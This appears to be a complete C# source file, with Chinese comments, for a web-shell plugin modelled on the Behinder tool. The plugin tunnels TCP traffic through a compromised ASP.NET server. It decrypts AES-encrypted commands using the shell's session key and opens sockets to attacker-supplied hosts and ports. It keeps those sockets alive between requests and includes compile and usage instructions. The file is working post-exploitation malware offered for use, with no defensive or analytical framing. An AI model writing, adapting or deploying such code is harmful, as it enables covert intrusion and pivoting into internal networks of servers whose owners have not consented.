// U_Tunnel.cs - 冰蝎式内存加载 TCP 隧道 payload (Application 状态版, 2026-08 实测)
// 用法: POST 密文 [本DLL + ~~~~~~ + a:base64(action),t:base64(ip),p:base64(port),id:base64(会话id),d:base64(数据)]
// action: connect / send / read / close
// 响应: 壳前缀 + "TUN:" + 状态/数据 (明文)
// 编译: csc /nologo /target:library /r:System.dll /r:System.Web.dll /out:U_Tunnel.dll U_Tunnel.cs
// 密钥 = Session[0] (壳写入的 AES 密钥), AES-128-CBC IV=key, PKCS7
// 关键点: ①请求体是密文必须先解密 ②socket 存 Application(static 不跨 Assembly.Load 持久!) ③read 必须非阻塞
using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Text;
using System.Web;
using System.Web.SessionState;
using System.Web.UI;

public class U
{
    private HttpRequest Req;
    private HttpResponse Res;
    private HttpApplicationState App;

    public override bool Equals(object obj)
    {
        Page p = (Page)obj;
        Req = p.Request;
        Res = p.Response;
        App = p.Application;
        try
        {
            string tail = GetTail();
            Dictionary<string, string> ps = ParseParams(tail);
            string action = G(ps, "a");
            string id = G(ps, "id");
            if (action == "connect")
            {
                string t = G(ps, "t");
                int port = int.Parse(G(ps, "p"));
                Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                s.ReceiveTimeout = 8000;
                s.SendTimeout = 10000;
                var ar = s.BeginConnect(t, port, null, null);
                if (!ar.AsyncWaitHandle.WaitOne(8000, false))
                {
                    Out("ERR:TIMEOUT");
                    try { s.Close(); } catch { }
                    return true;
                }
                s.EndConnect(ar);
                App.Lock();
                App["sk_" + id] = s;
                App.UnLock();
                Out("OK");
            }
            else if (action == "send")
            {
                Socket s = (Socket)App["sk_" + id];
                if (s == null) { Out("ERR:NOSOCK"); return true; }
                byte[] data = Convert.FromBase64String(G(ps, "d"));
                s.Send(data);
                OutB(Drain(s, true));
            }
            else if (action == "read")
            {
                Socket s = (Socket)App["sk_" + id];
                if (s == null) { Out("ERR:NOSOCK"); return true; }
                OutB(Drain(s, false));
            }
            else if (action == "close")
            {
                Socket s = (Socket)App["sk_" + id];
                if (s != null) { try { s.Close(); } catch { } }
                App.Lock();
                App.Remove("sk_" + id);
                App.UnLock();
                Out("CLOSED");
            }
            else
            {
                Out("ERR:NOACTION");
            }
        }
        catch (Exception ex)
        {
            try { Out("ERR:" + ex.Message.Replace("\r", "").Replace("\n", "")); } catch { }
        }
        return true;
    }

    // 读数据; blocking=true 等最多约8s, false 只读现有(非阻塞, 避免占会话)
    private byte[] Drain(Socket s, bool blocking)
    {
        List<byte> recv = new List<byte>();
        try
        {
            byte[] buf = new byte[8192];
            if (!blocking && s.Available == 0) return recv.ToArray();
            while (true)
            {
                int n = s.Receive(buf, SocketFlags.None);
                if (n <= 0) break;
                for (int i = 0; i < n; i++) recv.Add(buf[i]);
                if (s.Available == 0) break;
            }
        }
        catch { }
        return recv.ToArray();
    }

    private void Out(string s) { OutB(Encoding.UTF8.GetBytes(s)); }
    private void OutB(byte[] b)
    {
        byte[] hdr = Encoding.ASCII.GetBytes("TUN:");
        byte[] all = new byte[hdr.Length + b.Length];
        Buffer.BlockCopy(hdr, 0, all, 0, hdr.Length);
        Buffer.BlockCopy(b, 0, all, hdr.Length, b.Length);
        Res.BinaryWrite(all);
    }

    private string G(Dictionary<string, string> ps, string k)
    {
        string v;
        return ps.TryGetValue(k, out v) ? v : "";
    }

    // 参数从请求体尾部取: 先解密整个 body, 再找 0x7E×6 第二次出现
    private string GetTail()
    {
        Req.InputStream.Seek(0, System.IO.SeekOrigin.Begin);
        byte[] full = Decrypt(Req.BinaryRead(Req.ContentLength));
        byte[] marker = new byte[] { 126, 126, 126, 126, 126, 126 };
        int idx = -1, cnt = 0;
        for (int i = 0; i <= full.Length - 6; i++)
        {
            bool ok = true;
            for (int j = 0; j < 6; j++)
                if (full[i + j] != marker[j]) { ok = false; break; }
            if (ok) { cnt++; if (cnt == 2) { idx = i; break; } }
        }
        if (idx < 0) return "";
        return Encoding.Default.GetString(full, idx + 6, full.Length - idx - 6);
    }

    private byte[] Decrypt(byte[] data)
    {
        HttpSessionState ses = HttpContext.Current.Session;
        byte[] bytes = Encoding.Default.GetBytes(ses[0].ToString());
        return new System.Security.Cryptography.RijndaelManaged()
            .CreateDecryptor(bytes, bytes).TransformFinalBlock(data, 0, data.Length);
    }

    private Dictionary<string, string> ParseParams(string s)
    {
        Dictionary<string, string> d = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(s)) return d;
        foreach (string kv in s.Split(','))
        {
            string[] parts = kv.Split(':');
            if (parts.Length == 2)
            {
                try { d[parts[0]] = Encoding.UTF8.GetString(Convert.FromBase64String(parts[1])); }
                catch { }
            }
        }
        return d;
    }
}
